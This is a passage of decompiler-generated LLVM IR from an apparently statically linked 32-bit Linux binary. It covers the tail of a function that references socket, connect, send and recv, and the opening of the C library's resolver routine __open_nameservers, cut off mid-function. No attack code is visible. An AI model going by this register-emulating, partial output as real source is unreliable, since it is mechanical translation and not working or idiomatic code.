  %v0_8056ba9 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056ba9, i32* %eax.global-to-local, align 4
  %v1_8056bae = inttoptr i32 %v0_8056ba9 to i32*
  store i32 -1, i32* %v1_8056bae, align 4
  %v0_8056bb4 = load i32, i32* @esp, align 4
  %v1_8056bb4 = add i32 %v0_8056bb4, 56
  %v2_8056bb4 = inttoptr i32 %v1_8056bb4 to i32*
  %v3_8056bb4 = load i32, i32* %v2_8056bb4, align 4
  store i32 %v3_8056bb4, i32* %eax.global-to-local, align 4
  %v2_8056bb8 = add i32 %v0_8056bb4, 44
  %v3_8056bb8 = inttoptr i32 %v2_8056bb8 to i32*
  store i32 %v3_8056bb4, i32* %v3_8056bb8, align 4
  br label %dec_label_pc_8056bbc

dec_label_pc_8056bbc:                             ; preds = %dec_label_pc_8056921, %dec_label_pc_80568f9, %dec_label_pc_8056ba9
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8056ba9 ], [ %v0_80565ab, %dec_label_pc_8056921 ], [ %v0_80565ab, %dec_label_pc_80568f9 ]
  %v0_8056bbc = load i32, i32* @esp, align 4
  %v1_8056bbc = add i32 %v0_8056bbc, 20
  %v2_8056bbc = inttoptr i32 %v1_8056bbc to i32*
  %v3_8056bbc = load i32, i32* %v2_8056bbc, align 4
  %v13_8056bbc = icmp eq i32 %v3_8056bbc, -1
  br i1 %v13_8056bbc, label %dec_label_pc_8056bbc.dec_label_pc_8056bd2_crit_edge, label %dec_label_pc_8056bc3

dec_label_pc_8056bbc.dec_label_pc_8056bd2_crit_edge: ; preds = %dec_label_pc_8056bbc
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_8056bd2

dec_label_pc_8056bc3:                             ; preds = %dec_label_pc_8056bbc
  %v3_8056bc6 = load i32, i32* %v2_8056bbc, align 4
  %v5_8056bc6 = add i32 %v0_8056bbc, -16
  %v6_8056bc6 = inttoptr i32 %v5_8056bc6 to i32*
  store i32 %v3_8056bc6, i32* %v6_8056bc6, align 4
  %v1_8056bca = sext i16 %stack_var_-180.1 to i32
  %v2_8056bca = call i32 @__libc_close(i32 %v1_8056bca)
  store i32 %v2_8056bca, i32* %eax.global-to-local, align 4
  %v0_8056bcf = load i32, i32* @esp, align 4
  %v1_8056bcf = add i32 %v0_8056bcf, 16
  br label %dec_label_pc_8056bd2

dec_label_pc_8056bd2:                             ; preds = %dec_label_pc_8056bbc.dec_label_pc_8056bd2_crit_edge, %dec_label_pc_8056bc3
  %v1_8056bd9.pre-phi = phi i32 [ %.pre, %dec_label_pc_8056bbc.dec_label_pc_8056bd2_crit_edge ], [ %v1_8056bca, %dec_label_pc_8056bc3 ]
  %v0_8056bd2 = phi i32 [ %v0_8056bbc, %dec_label_pc_8056bbc.dec_label_pc_8056bd2_crit_edge ], [ %v1_8056bcf, %dec_label_pc_8056bc3 ]
  %v1_8056bd5 = add i32 %v0_8056bd2, 12
  %v2_8056bd5 = inttoptr i32 %v1_8056bd5 to i32*
  %v3_8056bd5 = load i32, i32* %v2_8056bd5, align 4
  %v5_8056bd5 = add i32 %v0_8056bd2, -16
  %v6_8056bd5 = inttoptr i32 %v5_8056bd5 to i32*
  store i32 %v3_8056bd5, i32* %v6_8056bd5, align 4
  %v2_8056bd9 = call i32 @free(i32 %v1_8056bd9.pre-phi)
  store i32 %v2_8056bd9, i32* %eax.global-to-local, align 4
  %v1_8056bde = load i32, i32* @esp, align 4
  %v2_8056bde = inttoptr i32 %v1_8056bde to i32*
  store i32 %v2_8056516, i32* %v2_8056bde, align 4
  %v2_8056be1 = call i32 @free(i32 %v1_8056bd9.pre-phi)
  store i32 %v2_8056be1, i32* @eax, align 4
  %v0_8056be6 = load i32, i32* @esp, align 4
  %v1_8056be9 = add i32 %v0_8056be6, 56
  %v2_8056be9 = inttoptr i32 %v1_8056be9 to i32*
  %v3_8056be9 = load i32, i32* %v2_8056be9, align 4
  %v13_8056be9 = icmp eq i32 %v3_8056be9, -1
  %v1_8056bee = add i32 %v0_8056be6, 32
  %v2_8056bee = inttoptr i32 %v1_8056bee to i32*
  store i32 -1, i32* %v2_8056bee, align 4
  br i1 %v13_8056be9, label %dec_label_pc_8056bd2.dec_label_pc_8056c45_crit_edge, label %dec_label_pc_8056bf8

dec_label_pc_8056bd2.dec_label_pc_8056c45_crit_edge: ; preds = %dec_label_pc_8056bd2
  %v0_8056c45.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056c45

dec_label_pc_8056bf8:                             ; preds = %dec_label_pc_8056bd2
  %v0_8056bf8 = load i32, i32* @ecx, align 4
  %v1_8056bf8 = load i32, i32* @esp, align 4
  %v2_8056bf8 = add i32 %v1_8056bf8, -4
  %v3_8056bf8 = inttoptr i32 %v2_8056bf8 to i32*
  store i32 %v0_8056bf8, i32* %v3_8056bf8, align 4
  %v1_8056bf9 = add i32 %v1_8056bf8, -8
  %v2_8056bf9 = inttoptr i32 %v1_8056bf9 to i32*
  store i32 ptrtoint (i8** @global_var_8062788.558 to i32), i32* %v2_8056bf9, align 4
  %v1_8056bfe = add i32 %v1_8056bf8, -12
  %v2_8056bfe = inttoptr i32 %v1_8056bfe to i32*
  store i32 134566343, i32* %v2_8056bfe, align 4
  %v1_8056c03 = add i32 %v1_8056bf8, 184
  store i32 %v1_8056c03, i32* %ebx.global-to-local, align 4
  %v2_8056c0a = add i32 %v1_8056bf8, -16
  %v3_8056c0a = inttoptr i32 %v2_8056c0a to i32*
  store i32 %v1_8056c03, i32* %v3_8056c0a, align 4
  %v3_8056c0b = call i32 @__pthread_return_void(i32 %v1_8056bd9.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056c0b, i32* %eax.global-to-local, align 4
  %v0_8056c10 = load i32, i32* @esp, align 4
  %v1_8056c10 = inttoptr i32 %v0_8056c10 to i32*
  store i32 ptrtoint (i8** @global_var_8062788.558 to i32), i32* %v1_8056c10, align 4
  %v2_8056c17 = call i32 @__pthread_return_0(i32 %v1_8056bd9.pre-phi)
  store i32 %v2_8056c17, i32* %eax.global-to-local, align 4
  %v0_8056c1c = load i32, i32* @esp, align 4
  %v1_8056c1c = add i32 %v0_8056c1c, 60
  %v2_8056c1c = inttoptr i32 %v1_8056c1c to i32*
  %v3_8056c1c = load i32, i32* %v2_8056c1c, align 4
  store i32 %v3_8056c1c, i32* %eax.global-to-local, align 4
  %v1_8056c20 = add i32 %v0_8056c1c, 56
  %v2_8056c20 = inttoptr i32 %v1_8056c20 to i32*
  %v3_8056c20 = load i32, i32* %v2_8056c20, align 4
  store i32 %v3_8056c20, i32* %edx.global-to-local, align 4
  %v1_8056c24 = trunc i32 %v3_8056c1c to i16
  store i16 %v1_8056c24, i16* @global_var_805c4e4.560, align 4
  %v1_8056c2a = inttoptr i32 %v0_8056c1c to i32*
  %v2_8056c2a = load i32, i32* %v1_8056c2a, align 4
  store i32 %v2_8056c2a, i32* @eax, align 4
  %v3_8056c2a = add i32 %v0_8056c1c, 4
  %v1_8056c2b = sext i32 %v3_8056c20 to i64
  store i64 %v1_8056c2b, i64* @global_var_80627a0.559, align 32
  %v1_8056c31 = inttoptr i32 %v3_8056c2a to i32*
  %v2_8056c31 = load i32, i32* %v1_8056c31, align 4
  store i32 %v2_8056c31, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8056c31, align 4
  %v0_8056c34 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056c34, i32* %v1_8056c2a, align 4
  %v3_8056c35 = call i32 @__pthread_return_void(i32 %v1_8056bd9.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056c35, i32* %eax.global-to-local, align 4
  %v0_8056c3a = load i32, i32* @esp, align 4
  %v1_8056c3a = add i32 %v0_8056c3a, 32
  %v2_8056c3a = inttoptr i32 %v1_8056c3a to i32*
  store i32 -1, i32* %v2_8056c3a, align 4
  br label %dec_label_pc_8056c42

dec_label_pc_8056c42:                             ; preds = %dec_label_pc_8056ab6, %dec_label_pc_8056bf8
  %v0_8056c42 = load i32, i32* @esp, align 4
  %v1_8056c42 = add i32 %v0_8056c42, 16
  br label %dec_label_pc_8056c45

dec_label_pc_8056c45:                             ; preds = %dec_label_pc_8056bd2.dec_label_pc_8056c45_crit_edge, %dec_label_pc_8056c42
  %v0_8056c45 = phi i32 [ %v0_8056c45.pre, %dec_label_pc_8056bd2.dec_label_pc_8056c45_crit_edge ], [ %v1_8056c42, %dec_label_pc_8056c42 ]
  %v1_8056c45 = add i32 %v0_8056c45, 16
  %v2_8056c45 = inttoptr i32 %v1_8056c45 to i32*
  %v3_8056c45 = load i32, i32* %v2_8056c45, align 4
  store i32 %v3_8056c45, i32* %eax.global-to-local, align 4
  %v1_8056c49 = add i32 %v0_8056c45, 220
  %v1_8056c4f = inttoptr i32 %v1_8056c49 to i32*
  %v2_8056c4f = load i32, i32* %v1_8056c4f, align 4
  store i32 %v2_8056c4f, i32* @ebx, align 4
  %v3_8056c4f = add i32 %v0_8056c45, 224
  %v1_8056c50 = inttoptr i32 %v3_8056c4f to i32*
  %v2_8056c50 = load i32, i32* %v1_8056c50, align 4
  store i32 %v2_8056c50, i32* @esi, align 4
  %v3_8056c50 = add i32 %v0_8056c45, 228
  %v1_8056c51 = inttoptr i32 %v3_8056c50 to i32*
  %v2_8056c51 = load i32, i32* %v1_8056c51, align 4
  store i32 %v2_8056c51, i32* @edi, align 4
  %v3_8056c51 = add i32 %v0_8056c45, 232
  %v1_8056c52 = inttoptr i32 %v3_8056c51 to i32*
  %v2_8056c52 = load i32, i32* %v1_8056c52, align 4
  store i32 %v2_8056c52, i32* @ebp, align 4
  ret i32 %v3_8056c45

; uselistorder directives
  uselistorder i32 %v0_8056c45, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056c1c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056bd2, { 1, 0 }
  uselistorder i32 %v1_8056bd9.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8056b84.pre, { 1, 0 }
  uselistorder i32 %v5_8056b57, { 1, 0 }
  uselistorder i32 %v3_8056b57, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8056b1f, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056ae8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056ab6, { 1, 0 }
  uselistorder i32 %v3_8056a95, { 1, 0, 2 }
  uselistorder i32 %v0_8056a86, { 1, 0 }
  uselistorder i32 %v5_8056a7c, { 1, 0 }
  uselistorder i32* %v3_8056a7c, { 1, 0 }
  uselistorder i32 %v0_805695267, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8056a7c, { 2, 1, 0 }
  uselistorder i32 %v5_8056a76, { 1, 0 }
  uselistorder i32 %v1_8056a75, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8056a71, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8056a35, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8056a0f, { 1, 0 }
  uselistorder i32 %v1_8056a00, { 1, 0 }
  uselistorder i32 %v3_80569d1, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80569bf, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8056966, { 1, 2, 0 }
  uselistorder i32 %v0_8056966, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8056940, { 1, 0 }
  uselistorder i32 %v0_8056948, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_8056936, { 1, 0, 2 }
  uselistorder i32 %v5_80568e2, { 1, 0 }
  uselistorder i32* %v2_80568e2, { 1, 0, 2 }
  uselistorder i32 %v3_805689a, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8056880, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_805685f, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_805683f, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80567e5, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80567ca, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80567b3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805673b, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80566ee, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80566cf, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80566b3, { 1, 0 }
  uselistorder i32 %v3_80566a8, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_80566a5, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_805664a, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8056645, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805662e, { 1, 0 }
  uselistorder i32 %v1_80565fa, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80565eb83, { 2, 1, 0 }
  uselistorder i16 %v0_80565ab, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_80565a4, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8056516, { 2, 6, 7, 11, 8, 9, 1, 5, 0, 3, 4, 10, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 69, 66, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 3, 2, 4, 0 }
  uselistorder i32 68, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 100, { 1, 5, 3, 4, 2, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 5, 4, 3, 6, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 8, 7, 6, 5, 4, 3, 2, 9, 0 }
  uselistorder i32 17, { 17, 14, 6, 13, 3, 4, 2, 7, 8, 9, 10, 1, 18, 5, 15, 16, 11, 12, 0 }
  uselistorder i32 176, { 4, 2, 3, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 4, 3, 1, 0 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 1, 4, 2, 0 }
  uselistorder i32 116, { 1, 3, 4, 2, 0 }
  uselistorder i32 72, { 1, 3, 4, 2, 5, 0 }
  uselistorder i32 84, { 5, 1, 6, 2, 4, 3, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 57, 58 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 26, 25, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 27 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 26, 21, 24, 22, 25, 27, 28, 23, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @__libc_close, { 17, 16, 15, 18, 25, 24, 23, 22, 21, 20, 13, 19, 14, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805c4e4.560, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_80627a0.559, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8062788.558 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8062788.558, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 10, 3, 11, 12, 4, 5, 0, 1, 2, 7, 8, 9, 6 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056c45, { 1, 0 }
  uselistorder label %dec_label_pc_8056c42, { 1, 0 }
  uselistorder label %dec_label_pc_8056bd2, { 1, 0 }
  uselistorder label %dec_label_pc_8056bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056ba9, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8056b84.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056b7c, { 1, 0 }
  uselistorder label %dec_label_pc_8056b63, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8056b18, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8056ab6, { 1, 0 }
  uselistorder label %dec_label_pc_8056a86, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8056a7c, { 1, 0 }
  uselistorder label %dec_label_pc_8056a71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056a6e, { 1, 0 }
  uselistorder label %dec_label_pc_80569e9, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056940, { 1, 0 }
  uselistorder label %dec_label_pc_80567b3, { 1, 0 }
  uselistorder label %dec_label_pc_805677c, { 1, 0 }
  uselistorder label %dec_label_pc_80566ee, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80565fa, { 1, 0 }
  uselistorder label %dec_label_pc_80565e4, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8056c54 = load i32, i32* @ebp, align 4
  store i32 134566343, i32* %stack_var_-216, align 4
  %v3_8056c63 = ptrtoint i32* %stack_var_-216 to i32
  %v2_8056c68 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056c68, i32* @eax, align 4
  %v2_8056c70 = call i32 @__pthread_return_void(i32 %v2_8056c68, i32 134566343)
  %v1_8056c7c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c4e8.497 to i32))
  store i32 %v1_8056c7c, i32* @eax, align 4
  %v0_8056c84 = load i32, i32* @global_var_8062bd4.498, align 4
  %tmp41 = icmp slt i32 %v0_8056c84, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8056e7b, label %dec_label_pc_8056c91

dec_label_pc_8056c91:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805b510.563 to i32), i32* %stack_var_-216, align 4
  %v2_8056c9d = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805b4de.564 to i32), i32 ptrtoint (i32* @global_var_805b510.563 to i32))
  store i32 %v2_8056c9d, i32* @eax, align 4
  %v1_8056ca5 = icmp eq i32 %v2_8056c9d, 0
  store i32 %v2_8056c9d, i32* @ebp, align 4
  %v1_8056ca9 = icmp eq i1 %v1_8056ca5, false
  br i1 %v1_8056ca9, label %dec_label_pc_8056e46.preheader, label %dec_label_pc_8056caf

dec_label_pc_8056caf:                             ; preds = %dec_label_pc_8056c91
  store i32 ptrtoint (i32* @global_var_805b510.563 to i32), i32* %stack_var_-216, align 4
  %v2_8056cbb = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805b4ef.565 to i32), i32 ptrtoint (i32* @global_var_805b510.563 to i32))
  %v1_8056cc3 = icmp eq i32 %v2_8056cbb, 0
  store i32 %v2_8056cbb, i32* @ebp, align 4
  %v1_8056cc7 = icmp eq i1 %v1_8056cc3, false
  br i1 %v1_8056cc7, label %dec_label_pc_8056e46.preheader, label %dec_label_pc_8056e70

dec_label_pc_8056e46.preheader:                   ; preds = %dec_label_pc_8056c91, %dec_label_pc_8056caf
  %v2_8056e4d = ptrtoint i32* %stack_var_-180 to i32
  %v3_8056d81 = add i32 %v3_8056c63, 164
  %v4_8056d70 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8056e46

dec_label_pc_8056cd2:                             ; preds = %dec_label_pc_8056cdd
  %v1_8056cd2 = add i32 %v0_8056cd256, 1
  store i32 %v1_8056cd2, i32* @ebx, align 4
  %v1_8056cd3 = inttoptr i32 %v1_8056cd2 to i8*
  %v2_8056cd3 = load i8, i8* %v1_8056cd3, align 1
  %v3_8056cd3 = zext i8 %v2_8056cd3 to i32
  %v5_8056cd3 = and i32 %v6_8056cd359, -256
  %v6_8056cd3 = or i32 %v3_8056cd3, %v5_8056cd3
  store i32 %v6_8056cd3, i32* @ecx, align 4
  %v4_8056cd5 = icmp eq i8 %v2_8056cd3, 0
  br i1 %v4_8056cd5, label %dec_label_pc_8056e46, label %dec_label_pc_8056cdd

dec_label_pc_8056cdd:                             ; preds = %dec_label_pc_8056cdd.lr.ph, %dec_label_pc_8056cd2
  %v6_8056cd359 = phi i32 [ %v6_8056cd353, %dec_label_pc_8056cdd.lr.ph ], [ %v6_8056cd3, %dec_label_pc_8056cd2 ]
  %v2_8056cd358 = phi i8 [ %v2_8056cd350, %dec_label_pc_8056cdd.lr.ph ], [ %v2_8056cd3, %dec_label_pc_8056cd2 ]
  %v1_8056cd357 = phi i8* [ %v1_8056cd349, %dec_label_pc_8056cdd.lr.ph ], [ %v1_8056cd3, %dec_label_pc_8056cd2 ]
  %v0_8056cd256 = phi i32 [ %v0_8056cd3.pre, %dec_label_pc_8056cdd.lr.ph ], [ %v1_8056cd2, %dec_label_pc_8056cd2 ]
  store i32 %v0_8056cdd.pre, i32* @eax, align 4
  %v2_8056ce2 = sext i8 %v2_8056cd358 to i32
  store i32 %v2_8056ce2, i32* @edx, align 4
  %v2_8056ce5 = mul nsw i32 %v2_8056ce2, 2
  %v3_8056ce5 = add i32 %v0_8056cdd.pre, %v2_8056ce5
  %v4_8056ce5 = inttoptr i32 %v3_8056ce5 to i8*
  %v5_8056ce5 = load i8, i8* %v4_8056ce5, align 1
  %v6_8056ce5 = and i8 %v5_8056ce5, 32
  %v7_8056ce5 = icmp eq i8 %v6_8056ce5, 0
  %v1_8056ce9 = icmp eq i1 %v7_8056ce5, false
  br i1 %v1_8056ce9, label %dec_label_pc_8056cd2, label %dec_label_pc_8056ceb

dec_label_pc_8056ceb:                             ; preds = %dec_label_pc_8056cdd
  %v10_8056ceb = icmp eq i8 %v2_8056cd358, 10
  br i1 %v10_8056ceb, label %dec_label_pc_8056e46, label %dec_label_pc_8056cf4

dec_label_pc_8056cf4:                             ; preds = %dec_label_pc_8056ceb
  %v10_8056cf4 = icmp eq i8 %v2_8056cd358, 35
  %v1_8056cff = icmp eq i1 %v10_8056cf4, false
  br i1 %v1_8056cff, label %dec_label_pc_8056d50.preheader, label %dec_label_pc_8056e46

dec_label_pc_8056d50.preheader:                   ; preds = %dec_label_pc_8056cf4
  %v2_8056d506 = load i8, i8* %v1_8056cd357, align 1
  %v3_8056d507 = icmp eq i8 %v2_8056d506, 0
  br i1 %v3_8056d507, label %dec_label_pc_8056d5c, label %dec_label_pc_8056d55

dec_label_pc_8056d06:                             ; preds = %dec_label_pc_8056d55
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8056d0a = load i32, i32* @esp, align 4
  %v3_8056d0a = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8056d0a = add nuw nsw i32 %v3_8056d0a, 152
  %v5_8056d0a = add i32 %v4_8056d0a, %v1_8056d0a
  %v6_8056d0a = inttoptr i32 %v5_8056d0a to i32*
  store i32 %v0_8056d0a, i32* %v6_8056d0a, align 4
  %v0_8056d14.pre = load i32, i32* @ebx, align 4
  %v4_8056d14.pre = load i32, i32* @ecx, align 4
  %v1_8056d1460 = inttoptr i32 %v0_8056d14.pre to i8*
  %v2_8056d1461 = load i8, i8* %v1_8056d1460, align 1
  %v3_8056d1462 = zext i8 %v2_8056d1461 to i32
  %v5_8056d1463 = and i32 %v4_8056d14.pre, -256
  %v6_8056d1464 = or i32 %v3_8056d1462, %v5_8056d1463
  %v4_8056d1665 = icmp eq i8 %v2_8056d1461, 0
  br i1 %v4_8056d1665, label %dec_label_pc_8056d33.preheader, label %dec_label_pc_8056d1a.lr.ph

dec_label_pc_8056d1a.lr.ph:                       ; preds = %dec_label_pc_8056d06
  %v0_8056d1a.pre = load i32, i32* @global_var_805c278, align 8
  br label %dec_label_pc_8056d1a

dec_label_pc_8056d13:                             ; preds = %dec_label_pc_8056d28
  %v1_8056d13 = add i32 %v0_8056d1367, 1
  store i32 %v1_8056d13, i32* @ebx, align 4
  %v1_8056d14 = inttoptr i32 %v1_8056d13 to i8*
  %v2_8056d14 = load i8, i8* %v1_8056d14, align 1
  %v3_8056d14 = zext i8 %v2_8056d14 to i32
  %v5_8056d14 = and i32 %v6_8056d1469, -256
  %v6_8056d14 = or i32 %v3_8056d14, %v5_8056d14
  %v4_8056d16 = icmp eq i8 %v2_8056d14, 0
  br i1 %v4_8056d16, label %dec_label_pc_8056d33.preheader, label %dec_label_pc_8056d1a

dec_label_pc_8056d1a:                             ; preds = %dec_label_pc_8056d1a.lr.ph, %dec_label_pc_8056d13
  %v6_8056d1469 = phi i32 [ %v6_8056d1464, %dec_label_pc_8056d1a.lr.ph ], [ %v6_8056d14, %dec_label_pc_8056d13 ]
  %v2_8056d1468 = phi i8 [ %v2_8056d1461, %dec_label_pc_8056d1a.lr.ph ], [ %v2_8056d14, %dec_label_pc_8056d13 ]
  %v0_8056d1367 = phi i32 [ %v0_8056d14.pre, %dec_label_pc_8056d1a.lr.ph ], [ %v1_8056d13, %dec_label_pc_8056d13 ]
  store i32 %v0_8056d1a.pre, i32* @eax, align 4
  %v2_8056d1f = sext i8 %v2_8056d1468 to i32
  store i32 %v2_8056d1f, i32* @edx, align 4
  %v2_8056d22 = mul nsw i32 %v2_8056d1f, 2
  %v3_8056d22 = add i32 %v0_8056d1a.pre, %v2_8056d22
  %v4_8056d22 = inttoptr i32 %v3_8056d22 to i8*
  %v5_8056d22 = load i8, i8* %v4_8056d22, align 1
  %v6_8056d22 = and i8 %v5_8056d22, 32
  %v7_8056d22 = icmp eq i8 %v6_8056d22, 0
  %v1_8056d26 = icmp eq i1 %v7_8056d22, false
  br i1 %v1_8056d26, label %dec_label_pc_8056d33.preheader, label %dec_label_pc_8056d28

dec_label_pc_8056d28:                             ; preds = %dec_label_pc_8056d1a
  %v10_8056d28 = icmp eq i8 %v2_8056d1468, 10
  %v1_8056d2b = icmp eq i1 %v10_8056d28, false
  br i1 %v1_8056d2b, label %dec_label_pc_8056d13, label %dec_label_pc_8056d33.preheader

dec_label_pc_8056d33.preheader:                   ; preds = %dec_label_pc_8056d28, %dec_label_pc_8056d1a, %dec_label_pc_8056d13, %dec_label_pc_8056d06
  %v0_8056d13.lcssa = phi i32 [ %v0_8056d14.pre, %dec_label_pc_8056d06 ], [ %v1_8056d13, %dec_label_pc_8056d13 ], [ %v0_8056d1367, %dec_label_pc_8056d1a ], [ %v0_8056d1367, %dec_label_pc_8056d28 ]
  %v6_8056d14.lcssa = phi i32 [ %v6_8056d1464, %dec_label_pc_8056d06 ], [ %v6_8056d14, %dec_label_pc_8056d13 ], [ %v6_8056d1469, %dec_label_pc_8056d1a ], [ %v6_8056d1469, %dec_label_pc_8056d28 ]
  %v1_8056d3375 = inttoptr i32 %v0_8056d13.lcssa to i8*
  %v2_8056d3376 = load i8, i8* %v1_8056d3375, align 1
  %v3_8056d3377 = zext i8 %v2_8056d3376 to i32
  %v5_8056d3378 = and i32 %v6_8056d14.lcssa, -256
  %v6_8056d3379 = or i32 %v3_8056d3377, %v5_8056d3378
  store i32 %v6_8056d3379, i32* @ecx, align 4
  %v4_8056d3580 = icmp eq i8 %v2_8056d3376, 0
